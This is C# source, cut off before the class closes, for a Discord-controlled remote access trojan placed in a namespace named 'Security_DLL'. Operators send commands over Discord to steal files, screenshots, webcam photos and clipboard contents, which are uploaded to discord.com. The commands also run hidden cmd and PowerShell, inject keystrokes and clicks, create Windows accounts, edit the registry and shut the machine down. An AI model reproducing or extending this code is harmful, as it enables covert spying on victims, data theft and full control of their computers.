using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Security_DLL
{
    internal class ManejoPC
    {
        private static readonly string BotToken = "";
        private static readonly ulong CanalID = 0;
        private static HttpClient client = new HttpClient();

        static ManejoPC()
        {
            client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");
        }

        public static async Task MostrarAyuda()
        {
            string ayuda = @"
**🖥️ MANEJO PC - COMANDOS DISPONIBLES**

**📁 ARCHIVOS Y CARPETAS:**
`/mpc listar C:\` - Lista archivos y carpetas
`/mpc enviar C:\archivo.txt` - Envía archivo a Discord
`/mpc eliminar C:\archivo.txt` - Elimina archivo/carpeta
`/mpc copiar origen destino` - Copia archivo
`/mpc mover origen destino` - Mueve archivo
`/mpc renombrar ruta nuevo` - Renombra archivo
`/mpc crear_carpeta C:\nueva` - Crea carpeta

**🔧 PROCESOS:**
`/mpc procesos` - Lista procesos activos
`/mpc matar 1234` - Mata proceso por PID
`/mpc matar_nombre chrome` - Mata proceso por nombre
`/mpc iniciar notepad` - Inicia programa
`/mpc prioridad 1234 alta` - Cambia prioridad proceso

**💻 SISTEMA:**
`/mpc apagar` - Apaga PC
`/mpc reiniciar` - Reinicia PC
`/mpc hibernar` - Hiberna PC
`/mpc suspender` - Suspende PC
`/mpc bloquear` - Bloquea pantalla
`/mpc cerrar_sesion` - Cierra sesión
`/mpc info` - Información del sistema
`/mpc ip` - IP pública y local
`/mpc disk` - Info de discos
`/mpc red` - Info de red

**🪟 VENTANAS:**
`/mpc ventanas` - Lista ventanas abiertas
`/mpc cerrar_ventana titulo` - Cierra ventana
`/mpc minimizar todo` - Minimiza todas las ventanas

**🔊 SONIDO:**
`/mpc volumen 50` - Cambia volumen (0-100)
`/mpc mute` - Silencia audio
`/mpc unmute` - Quita silencio

**📸 CAPTURA:**
`/mpc screenshot` - Captura pantalla
`/mpc webcam` - Foto de cámara

**⌨️ TECLADO/MOUSE:**
`/mpc escribir Hola` - Escribe texto
`/mpc presionar ENTER` - Presiona tecla
`/mpc click` - Click izquierdo
`/mpc click_derecho` - Click derecho
`/mpc mover_mouse 500 400` - Mueve mouse

**📋 PORTApapeles:**
`/mpc clipboard` - Muestra portapapeles
`/mpc clipboard_set texto` - Copia texto

**🖥️ ESCRITORIO:**
`/mpc wallpaper ruta.jpg` - Cambia wallpaper
`/mpc resolucion 1920 1080` - Cambia resolución
`/mpc ocultar_iconos` - Oculta iconos escritorio
`/mpc mostrar_iconos` - Muestra iconos escritorio

**⏰ TAREAS:**
`/mpc temporizador 60 apagar` - Temporizador (segundos)
`/mpc cancelar_temporizador` - Cancela temporizador

**🔐 SEGURIDAD:**
`/mpc usuarios` - Lista usuarios del sistema
`/mpc crear_usuario nombre pass` - Crea usuario
`/mpc eliminar_usuario nombre` - Elimina usuario

**📦 PROGRAMAS:**
`/mpc instalar nombre` - Instala programa (winget)
`/mpc desinstalar nombre` - Desinstala programa
`/mpc programas` - Lista programas instalados

**🔄 SERVICIOS:**
`/mpc servicios` - Lista servicios
`/mpc iniciar_servicio nombre` - Inicia servicio
`/mpc detener_servicio nombre` - Detiene servicio

**📊 RENDIMIENTO:**
`/mpc cpu` - Uso de CPU
`/mpc ram` - Uso de RAM
`/mpc bateria` - Estado de batería

**🌐 RED:**
`/mpc wifi` - Lista redes WiFi
`/mpc conectar_wifi SSID pass` - Conecta a WiFi
`/mpc liberar_ip` - Libera IP
`/mpc renovar_ip` - Renueva IP

**🗑️ MANTENIMIENTO:**
`/mpc limpiar_temp` - Limpia archivos temporales
`/mpc vaciar_papelera` - Vacía papelera
`/mpc desfragmentar C:` - Desfragmenta disco

**🔑 REGISTRO:**
`/mpc reg_read HKLM\Software\...` - Lee registro
`/mpc reg_write HKLM\Software\... valor` - Escribe registro

**📦 COMPRIMIR:**
`/mpc zip carpeta` - Comprime carpeta
`/mpc unzip archivo.zip` - Descomprime

**🔄 COMANDOS CMD:**
`/mpc cmd ipconfig` - Ejecuta CMD
`/mpc powershell Get-Process` - Ejecuta PowerShell

**ℹ️ AYUDA:**
`/mpchelp` o `ManejoHelp` - Muestra esta ayuda";
            await EnviarMensaje(ayuda);
        }

        public static async Task EjecutarComando(string comando)
        {
            string cmd = comando.ToLower().Trim();

            // Archivos
            if (cmd.StartsWith("/mpc listar "))
            {
                string ruta = comando.Substring(12);
                await ListarArchivos(ruta);
            }
            else if (cmd.StartsWith("/mpc enviar "))
            {
                string ruta = comando.Substring(12);
                await EnviarArchivo(ruta);
            }
            else if (cmd.StartsWith("/mpc eliminar "))
            {
                string ruta = comando.Substring(14);
                await EliminarArchivo(ruta);
            }
            else if (cmd.StartsWith("/mpc copiar "))
            {
                string[] partes = comando.Substring(11).Split(' ');
                if (partes.Length >= 2)
                    await CopiarArchivo(partes[0], partes[1]);
            }
            else if (cmd.StartsWith("/mpc mover "))
            {
                string[] partes = comando.Substring(11).Split(' ');
                if (partes.Length >= 2)
                    await MoverArchivo(partes[0], partes[1]);
            }
            else if (cmd.StartsWith("/mpc renombrar "))
            {
                string[] partes = comando.Substring(15).Split(' ');
                if (partes.Length >= 2)
                    await RenombrarArchivo(partes[0], partes[1]);
            }
            else if (cmd.StartsWith("/mpc crear_carpeta "))
            {
                string ruta = comando.Substring(19);
                await CrearCarpeta(ruta);
            }
            // Procesos
            else if (cmd == "/mpc procesos")
            {
                await ListarProcesos();
            }
            else if (cmd.StartsWith("/mpc matar "))
            {
                string pid = comando.Substring(12);
                await MatarProceso(pid);
            }
            else if (cmd.StartsWith("/mpc matar_nombre "))
            {
                string nombre = comando.Substring(19);
                await MatarProcesoPorNombre(nombre);
            }
            else if (cmd.StartsWith("/mpc iniciar "))
            {
                string programa = comando.Substring(14);
                await IniciarPrograma(programa);
            }
            else if (cmd.StartsWith("/mpc prioridad "))
            {
                string[] partes = comando.Substring(15).Split(' ');
                if (partes.Length >= 2)
                    await CambiarPrioridad(partes[0], partes[1]);
            }
            // Sistema
            else if (cmd == "/mpc apagar")
            {
                await ApagarPC();
            }
            else if (cmd == "/mpc reiniciar")
            {
                await ReiniciarPC();
            }
            else if (cmd == "/mpc hibernar")
            {
                await HibernarPC();
            }
            else if (cmd == "/mpc suspender")
            {
                await SuspenderPC();
            }
            else if (cmd == "/mpc bloquear")
            {
                BloquearPC();
            }
            else if (cmd == "/mpc cerrar_sesion")
            {
                CerrarSesion();
            }
            else if (cmd == "/mpc info")
            {
                await InfoSistema();
            }
            else if (cmd == "/mpc ip")
            {
                await InfoIP();
            }
            else if (cmd == "/mpc disk")
            {
                await InfoDisk();
            }
            else if (cmd == "/mpc red")
            {
                await InfoRed();
            }
            // Ventanas
            else if (cmd == "/mpc ventanas")
            {
                await ListarVentanas();
            }
            else if (cmd.StartsWith("/mpc cerrar_ventana "))
            {
                string titulo = comando.Substring(20);
                await CerrarVentana(titulo);
            }
            else if (cmd == "/mpc minimizar todo")
            {
                MinimizarTodo();
            }
            // Sonido
            else if (cmd.StartsWith("/mpc volumen "))
            {
                string[] partes = comando.Substring(14).Split(' ');
                if (partes.Length >= 1)
                    await CambiarVolumen(int.Parse(partes[0]));
            }
            else if (cmd == "/mpc mute")
            {
                Silenciar();
            }
            else if (cmd == "/mpc unmute")
            {
                QuitarSilencio();
            }
            // Captura
            else if (cmd == "/mpc screenshot")
            {
                await TomarScreenshot();
            }
            else if (cmd == "/mpc webcam")
            {
                await FotoCam.TomarFotoYEnviar();
            }
            // Teclado/Mouse
            else if (cmd.StartsWith("/mpc escribir "))
            {
                string texto = comando.Substring(15);
                EscribirTexto(texto);
            }
            else if (cmd.StartsWith("/mpc presionar "))
            {
                string tecla = comando.Substring(16);
                PresionarTecla(tecla);
            }
            else if (cmd == "/mpc click")
            {
                ClickMouse();
            }
            else if (cmd == "/mpc click_derecho")
            {
                ClickMouseDerecho();
            }
            else if (cmd.StartsWith("/mpc mover_mouse "))
            {
                string[] partes = comando.Substring(18).Split(' ');
                if (partes.Length >= 2)
                    MoverMouse(int.Parse(partes[0]), int.Parse(partes[1]));
            }
            // Portapapeles
            else if (cmd == "/mpc clipboard")
            {
                await MostrarClipboard();
            }
            else if (cmd.StartsWith("/mpc clipboard_set "))
            {
                string texto = comando.Substring(22);
                SetClipboard(texto);
            }
            // Escritorio
            else if (cmd.StartsWith("/mpc wallpaper "))
            {
                string ruta = comando.Substring(16);
                await CambiarWallpaper(ruta);
            }
            else if (cmd.StartsWith("/mpc resolucion "))
            {
                string[] partes = comando.Substring(17).Split(' ');
                if (partes.Length >= 2)
                    CambiarResolucion(int.Parse(partes[0]), int.Parse(partes[1]));
            }
            else if (cmd == "/mpc ocultar_iconos")
            {
                OcultarIconos();
            }
            else if (cmd == "/mpc mostrar_iconos")
            {
                MostrarIconos();
            }
            // Tareas
            else if (cmd.StartsWith("/mpc temporizador "))
            {
                string[] partes = comando.Substring(18).Split(' ');
                if (partes.Length >= 2)
                    await IniciarTemporizador(int.Parse(partes[0]), partes[1]);
            }
            else if (cmd == "/mpc cancelar_temporizador")
            {
                CancelarTemporizador();
            }
            // Seguridad
            else if (cmd == "/mpc usuarios")
            {
                await ListarUsuarios();
            }
            else if (cmd.StartsWith("/mpc crear_usuario "))
            {
                string[] partes = comando.Substring(20).Split(' ');
                if (partes.Length >= 2)
                    await CrearUsuario(partes[0], partes[1]);
            }
            else if (cmd.StartsWith("/mpc eliminar_usuario "))
            {
                string nombre = comando.Substring(22);
                await EliminarUsuario(nombre);
            }
            // Programas
            else if (cmd.StartsWith("/mpc instalar "))
            {
                string nombre = comando.Substring(16);
                await InstalarPrograma(nombre);
            }
            else if (cmd.StartsWith("/mpc desinstalar "))
            {
                string nombre = comando.Substring(18);
                await DesinstalarPrograma(nombre);
            }
            else if (cmd == "/mpc programas")
            {
                await ListarProgramas();
            }
            // Servicios
            else if (cmd == "/mpc servicios")
            {
                await ListarServicios();
            }
            else if (cmd.StartsWith("/mpc iniciar_servicio "))
            {
                string nombre = comando.Substring(22);
                await IniciarServicio(nombre);
            }
            else if (cmd.StartsWith("/mpc detener_servicio "))
            {
                string nombre = comando.Substring(22);
                await DetenerServicio(nombre);
            }
            // Rendimiento
            else if (cmd == "/mpc cpu")
            {
                await MostrarCPU();
            }
            else if (cmd == "/mpc ram")
            {
                await MostrarRAM();
            }
            else if (cmd == "/mpc bateria")
            {
                await MostrarBateria();
            }
            // Red
            else if (cmd == "/mpc wifi")
            {
                await ListarWifi();
            }
            else if (cmd.StartsWith("/mpc conectar_wifi "))
            {
                string[] partes = comando.Substring(20).Split(' ');
                if (partes.Length >= 2)
                    await ConectarWifi(partes[0], partes[1]);
            }
            else if (cmd == "/mpc liberar_ip")
            {
                await LiberarIP();
            }
            else if (cmd == "/mpc renovar_ip")
            {
                await RenovarIP();
            }
            // Mantenimiento
            else if (cmd == "/mpc limpiar_temp")
            {
                await LimpiarTemp();
            }
            else if (cmd == "/mpc vaciar_papelera")
            {
                await VaciarPapelera();
            }
            else if (cmd.StartsWith("/mpc desfragmentar "))
            {
                string disco = comando.Substring(20);
                await Desfragmentar(disco);
            }
            // Registro
            else if (cmd.StartsWith("/mpc reg_read "))
            {
                string ruta = comando.Substring(15);
                await LeerRegistro(ruta);
            }
            else if (cmd.StartsWith("/mpc reg_write "))
            {
                string[] partes = comando.Substring(16).Split(' ');
                if (partes.Length >= 2)
                    await EscribirRegistro(partes[0], partes[1]);
            }
            // Comprimir
            else if (cmd.StartsWith("/mpc zip "))
            {
                string carpeta = comando.Substring(10);
                await ComprimirZip(carpeta);
            }
            else if (cmd.StartsWith("/mpc unzip "))
            {
                string archivo = comando.Substring(12);
                await DescomprimirZip(archivo);
            }
            // CMD
            else if (cmd.StartsWith("/mpc cmd "))
            {
                string comandoCMD = comando.Substring(10);
                await EjecutarCMD(comandoCMD);
            }
            else if (cmd.StartsWith("/mpc powershell "))
            {
                string psComando = comando.Substring(17);
                await EjecutarPowerShell(psComando);
            }
            else if (cmd == "/mpchelp" || cmd == "manejohelp")
            {
                await MostrarAyuda();
            }
            else if (!string.IsNullOrEmpty(cmd) && cmd.StartsWith("/mpc"))
            {
                await EnviarMensaje($"❌ Comando no reconocido: `{cmd}`\nUsa `/mpchelp` para ver comandos");
            }
        }

        // ==================== IMPLEMENTACIONES ====================
        private static async Task ListarArchivos(string ruta)
        {
            try
            {
                if (!Directory.Exists(ruta))
                {
                    await EnviarMensaje($"❌ Carpeta no existe: {ruta}");
                    return;
                }
                var dir = new DirectoryInfo(ruta);
                var archivos = dir.GetFiles();
                var carpetas = dir.GetDirectories();
                StringBuilder sb = new StringBuilder();
                sb.AppendLine($"📁 **{ruta}**");
                sb.AppendLine("```");
                sb.AppendLine($"📂 CARPETAS ({carpetas.Length}):");
                foreach (var c in carpetas.Take(15))
                    sb.AppendLine($"  📁 {c.Name}");
                sb.AppendLine($"\n📄 ARCHIVOS ({archivos.Length}):");
                foreach (var a in archivos.Take(20))
                    sb.AppendLine($"  📄 {a.Name} ({a.Length / 1024} KB)");
                sb.AppendLine("```");
                await EnviarMensaje(sb.ToString());
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task EnviarArchivo(string ruta)
        {
            try
            {
                if (!File.Exists(ruta))
                {
                    await EnviarMensaje($"❌ Archivo no existe: {ruta}");
                    return;
                }
                var info = new FileInfo(ruta);
                if (info.Length > 8_388_608)
                {
                    await EnviarMensaje($"❌ Archivo muy grande ({info.Length / 1024 / 1024}MB)");
                    return;
                }
                await EnviarArchivoADiscord(ruta);
                await EnviarMensaje($"✅ Archivo enviado: {info.Name}");
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task EliminarArchivo(string ruta)
        {
            try
            {
                if (File.Exists(ruta)) { File.Delete(ruta); await EnviarMensaje($"✅ Eliminado: {ruta}"); }
                else if (Directory.Exists(ruta)) { Directory.Delete(ruta, true); await EnviarMensaje($"✅ Eliminado: {ruta}"); }
                else { await EnviarMensaje($"❌ No existe: {ruta}"); }
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task CopiarArchivo(string origen, string destino)
        {
            try { File.Copy(origen, destino, true); await EnviarMensaje($"✅ Copiado: {origen} -> {destino}"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task MoverArchivo(string origen, string destino)
        {
            try { File.Move(origen, destino); await EnviarMensaje($"✅ Movido: {origen} -> {destino}"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task RenombrarArchivo(string ruta, string nuevoNombre)
        {
            try
            {
                string directorio = Path.GetDirectoryName(ruta);
                string nuevaRuta = Path.Combine(directorio, nuevoNombre);
                File.Move(ruta, nuevaRuta);
                await EnviarMensaje($"✅ Renombrado: {Path.GetFileName(ruta)} -> {nuevoNombre}");
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task CrearCarpeta(string ruta)
        {
            try { Directory.CreateDirectory(ruta); await EnviarMensaje($"✅ Carpeta creada: {ruta}"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task ListarProcesos()
        {
            try
            {
                var procesos = Process.GetProcesses();
                StringBuilder sb = new StringBuilder();
                sb.AppendLine($"📊 **PROCESOS ({procesos.Length})**");
                sb.AppendLine("```");
                sb.AppendLine($"{"PID",-8} {"Nombre",-25} {"Memoria MB",-10}");
                sb.AppendLine(new string('-', 50));
                foreach (var p in procesos.Take(30))
                {
                    try { sb.AppendLine($"{p.Id,-8} {p.ProcessName,-25} {p.WorkingSet64 / 1024 / 1024,-10}"); }
                    catch { }
                }
                sb.AppendLine("```");
                await EnviarMensaje(sb.ToString());
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task MatarProceso(string pid)
        {
            try { Process.GetProcessById(int.Parse(pid)).Kill(); await EnviarMensaje($"✅ Proceso {pid} terminado"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task MatarProcesoPorNombre(string nombre)
        {
            try
            {
                var procesos = Process.GetProcessesByName(nombre);
                foreach (var p in procesos) p.Kill();
                await EnviarMensaje($"✅ {procesos.Length} procesos '{nombre}' terminados");
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task IniciarPrograma(string programa)
        {
            try { Process.Start(programa); await EnviarMensaje($"✅ Programa iniciado: {programa}"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task CambiarPrioridad(string pid, string prioridad)
        {
            try
            {
                var p = Process.GetProcessById(int.Parse(pid));
                var prioridades = new Dictionary<string, ProcessPriorityClass>
                {
                    {"baja", ProcessPriorityClass.Idle},
                    {"normal", ProcessPriorityClass.Normal},
                    {"alta", ProcessPriorityClass.High},
                    {"tiempo_real", ProcessPriorityClass.RealTime}
                };
                if (prioridades.ContainsKey(prioridad.ToLower()))
                    p.PriorityClass = prioridades[prioridad.ToLower()];
                await EnviarMensaje($"✅ Prioridad cambiada para PID {pid} a {prioridad}");
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task ApagarPC()
        { await EnviarMensaje("🖥️ Apagando PC..."); Process.Start("shutdown", "/s /t 10"); }

        private static async Task ReiniciarPC()
        { await EnviarMensaje("🔄 Reiniciando PC..."); Process.Start("shutdown", "/r /t 10"); }

        private static async Task HibernarPC()
        { await EnviarMensaje("💤 Hibernando PC..."); Process.Start("shutdown", "/h"); }

        private static async Task SuspenderPC()
        { await EnviarMensaje("😴 Suspendiendo PC..."); Process.Start("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0"); }

        private static void BloquearPC() { Process.Start("rundll32.exe", "user32.dll,LockWorkStation"); }

        private static void CerrarSesion() { Process.Start("shutdown", "/l"); }

        private static async Task InfoSistema()
        {
            string info = $"**💻 PC:** {Environment.MachineName}\n**👤 Usuario:** {Environment.UserName}\n**💿 SO:** {Environment.OSVersion}\n**🕐 Hora:** {DateTime.Now}";
            await EnviarMensaje(info);
        }

        private static async Task InfoIP()
        {
            string ipPublica = "";
            try { using (var web = new WebClient()) ipPublica = await web.DownloadStringTaskAsync("https://api.ipify.org"); }
            catch { ipPublica = "No disponible"; }
            await EnviarMensaje($"🌐 **IP Pública:** {ipPublica}\n🏠 **IP Local:** {Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString() ?? "No disponible"}");
        }

        private static async Task InfoDisk()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("💾 **DISCOS:**");
            sb.AppendLine("```");
            foreach (var d in DriveInfo.GetDrives())
            {
                if (d.IsReady)
                    sb.AppendLine($"{d.Name} - {d.TotalSize / 1024 / 1024 / 1024}GB total, {d.AvailableFreeSpace / 1024 / 1024 / 1024}GB libre");
            }
            sb.AppendLine("```");
            await EnviarMensaje(sb.ToString());
        }

        private static async Task InfoRed()
        {
            var p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c ipconfig";
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            string output = await p.StandardOutput.ReadToEndAsync();
            await EnviarMensaje($"```\n{output}\n```");
        }

        private static async Task ListarVentanas()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("🪟 **VENTANAS ABIERTAS:**");
            sb.AppendLine("```");
            foreach (var p in Process.GetProcesses())
            {
                try { if (!string.IsNullOrEmpty(p.MainWindowTitle)) sb.AppendLine($"• {p.ProcessName}: {p.MainWindowTitle}"); }
                catch { }
            }
            sb.AppendLine("```");
            await EnviarMensaje(sb.ToString());
        }

        private static async Task CerrarVentana(string titulo)
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    if (p.MainWindowTitle.ToLower().Contains(titulo.ToLower()))
                    {
                        p.CloseMainWindow();
                        await EnviarMensaje($"✅ Ventana cerrada: {p.MainWindowTitle}");
                        return;
                    }
                }
                catch { }
            }
            await EnviarMensaje($"❌ No se encontró: {titulo}");
        }

        private static void MinimizarTodo() { SendKeys.SendWait("Win+D"); }

        private static async Task CambiarVolumen(int nivel)
        {
            nivel = Math.Max(0, Math.Min(100, nivel));
            for (int i = 0; i < 50; i++) SendKeys.SendWait("{VOLUME_DOWN}");
            for (int i = 0; i < nivel / 2; i++) SendKeys.SendWait("{VOLUME_UP}");
            await EnviarMensaje($"🔊 Volumen cambiado a {nivel}%");
        }

        private static void Silenciar() { SendKeys.SendWait("{VOLUME_MUTE}"); }
        private static void QuitarSilencio() { SendKeys.SendWait("{VOLUME_MUTE}"); }

        private static async Task TomarScreenshot()
        {
            try
            {
                var bounds = Screen.PrimaryScreen.Bounds;
                using (var bmp = new Bitmap(bounds.Width, bounds.Height))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                    string temp = Path.GetTempFileName() + ".jpg";
                    bmp.Save(temp, System.Drawing.Imaging.ImageFormat.Jpeg);
                    await EnviarArchivoADiscord(temp);
                    File.Delete(temp);
                    await EnviarMensaje("✅ Captura enviada");
                }
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static void EscribirTexto(string texto) { SendKeys.SendWait(texto); }
        private static void PresionarTecla(string tecla) { SendKeys.SendWait($"{{{tecla.ToUpper()}}}"); }
        private static void ClickMouse() { mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); }
        private static void ClickMouseDerecho() { mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0); mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0); }
        private static void MoverMouse(int x, int y) { Cursor.Position = new Point(x, y); }

        private static async Task MostrarClipboard()
        {
            try { await EnviarMensaje($"📋 **Portapapeles:**\n```{Clipboard.GetText()}```"); }
            catch { await EnviarMensaje("📋 Portapapeles vacío o no accesible"); }
        }

        private static void SetClipboard(string texto) { Clipboard.SetText(texto); }

        private static async Task CambiarWallpaper(string ruta)
        {
            try
            {
                if (!File.Exists(ruta)) { await EnviarMensaje("❌ Imagen no encontrada"); return; }
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                key.SetValue(@"Wallpaper", ruta);
                key.SetValue(@"WallpaperStyle", "2");
                key.SetValue(@"TileWallpaper", "0");
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, ruta, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
                await EnviarMensaje($"✅ Wallpaper cambiado: {Path.GetFileName(ruta)}");
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static void CambiarResolucion(int ancho, int alto) { /* Requiere librería adicional */ }

        private static void OcultarIconos() { Process.Start("cmd.exe", "/c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDesktop /t REG_DWORD /d 1 /f"); }
        private static void MostrarIconos() { Process.Start("cmd.exe", "/c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDesktop /f"); }

        private static System.Timers.Timer temporizador;
        private static async Task IniciarTemporizador(int segundos, string accion)
        {
            await EnviarMensaje($"⏰ Temporizador iniciado: {segundos} segundos para {accion}");
            temporizador = new System.Timers.Timer(segundos * 1000);
            temporizador.Elapsed += async (s, e) =>
            {
                temporizador.Stop();
                if (accion == "apagar") await ApagarPC();
                else if (accion == "reiniciar") await ReiniciarPC();
                else if (accion == "suspender") await SuspenderPC();
                else if (accion == "hibernar") await HibernarPC();
                else if (accion == "mensaje") await EnviarMensaje("⏰ Tiempo completado!");
            };
            temporizador.Start();
        }

        private static void CancelarTemporizador()
        {
            if (temporizador != null) { temporizador.Stop(); temporizador.Dispose(); }
        }

        private static async Task ListarUsuarios()
        {
            var users = new List<string>();
            foreach (var d in Directory.GetDirectories(@"C:\Users"))
            {
                string user = Path.GetFileName(d);
                if (!new[] { "Public", "Default", "All Users", "Default User" }.Contains(user))
                    users.Add(user);
            }
            await EnviarMensaje($"👥 **USUARIOS:**\n```\n{string.Join("\n", users)}\n```");
        }

        private static async Task CrearUsuario(string nombre, string pass)
        {
            try { Process.Start("cmd.exe", $"/c net user {nombre} {pass} /add"); await EnviarMensaje($"✅ Usuario creado: {nombre}"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task EliminarUsuario(string nombre)
        {
            try { Process.Start("cmd.exe", $"/c net user {nombre} /delete"); await EnviarMensaje($"✅ Usuario eliminado: {nombre}"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task InstalarPrograma(string nombre)
        {
            try { Process.Start("winget", $"install \"{nombre}\" -e"); await EnviarMensaje($"✅ Instalando: {nombre}"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task DesinstalarPrograma(string nombre)
        {
            try { Process.Start("winget", $"uninstall \"{nombre}\" -e"); await EnviarMensaje($"✅ Desinstalando: {nombre}"); }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task ListarProgramas()
        {
            await EnviarMensaje("📦 **Listando programas instalados...**");
            Process.Start("winget", "list");
        }

        private static async Task ListarServicios() { await EjecutarCMD("sc query state= all"); }
        private static async Task IniciarServicio(string nombre) { await EjecutarCMD($"net start \"{nombre}\""); }
        private static async Task DetenerServicio(string nombre) { await EjecutarCMD($"net stop \"{nombre}\""); }

        private static async Task MostrarCPU() { await EjecutarCMD("wmic cpu get loadpercentage"); }
        private static async Task MostrarRAM() { await EjecutarCMD("wmic OS get TotalVisibleMemorySize,FreePhysicalMemory"); }
        private static async Task MostrarBateria() { await EjecutarCMD("wmic path Win32_Battery get EstimatedChargeRemaining"); }

        private static async Task ListarWifi() { await EjecutarCMD("netsh wlan show profiles"); }
        private static async Task ConectarWifi(string ssid, string pass) { await EjecutarCMD($"netsh wlan connect name=\"{ssid}\" ssid=\"{ssid}\" interface=*"); }
        private static async Task LiberarIP() { await EjecutarCMD("ipconfig /release"); }
        private static async Task RenovarIP() { await EjecutarCMD("ipconfig /renew"); }

        private static async Task LimpiarTemp()
        {
            try
            {
                string tempPath = Path.GetTempPath();
                var files = Directory.GetFiles(tempPath);
                var deleted = 0;
                foreach (var f in files) { try { File.Delete(f); deleted++; } catch { } }
                await EnviarMensaje($"✅ Limpiados {deleted} archivos temporales");
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task VaciarPapelera() { Process.Start("cmd.exe", "/c rd /s /q C:\\$Recycle.bin"); await EnviarMensaje("✅ Papelera vaciada"); }
        private static async Task Desfragmentar(string disco) { await EjecutarCMD($"defrag {disco} /o"); }

        private static async Task LeerRegistro(string ruta) { await EjecutarCMD($"reg query \"{ruta}\""); }
        private static async Task EscribirRegistro(string ruta, string valor) { await EjecutarCMD($"reg add \"{ruta}\" /ve /d \"{valor}\" /f"); }

        private static async Task ComprimirZip(string carpeta) { await EjecutarCMD($"powershell Compress-Archive -Path \"{carpeta}\" -DestinationPath \"{carpeta}.zip\""); }
        private static async Task DescomprimirZip(string archivo) { await EjecutarCMD($"powershell Expand-Archive -Path \"{archivo}\" -DestinationPath \"{Path.GetDirectoryName(archivo)}\""); }

        private static async Task EjecutarCMD(string comando)
        {
            try
            {
                var p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = $"/c {comando}";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string output = await p.StandardOutput.ReadToEndAsync();
                await EnviarMensaje($"```\n{output.Substring(0, Math.Min(1900, output.Length))}\n```");
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task EjecutarPowerShell(string comando)
        {
            try
            {
                var p = new Process();
                p.StartInfo.FileName = "powershell.exe";
                p.StartInfo.Arguments = $"-Command \"{comando}\"";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string output = await p.StandardOutput.ReadToEndAsync();
                await EnviarMensaje($"```\n{output.Substring(0, Math.Min(1900, output.Length))}\n```");
            }
            catch (Exception ex) { await EnviarMensaje($"❌ Error: {ex.Message}"); }
        }

        private static async Task EnviarMensaje(string mensaje)
        {
            try
            {
                var payload = new { content = mensaje };
                string json = System.Text.Json.JsonSerializer.Serialize(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync($"https://discord.com/api/v10/channels/{CanalID}/messages", content);
            }
            catch { }
        }

        private static async Task EnviarArchivoADiscord(string ruta)
        {
            try
            {
                byte[] data = File.ReadAllBytes(ruta);
                using (var form = new MultipartFormDataContent())
                {
                    var file = new ByteArrayContent(data);
                    file.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                    form.Add(file, "file", Path.GetFileName(ruta));
                    await client.PostAsync($"https://discord.com/api/v10/channels/{CanalID}/messages", form);
                }
            }
            catch { }
        }

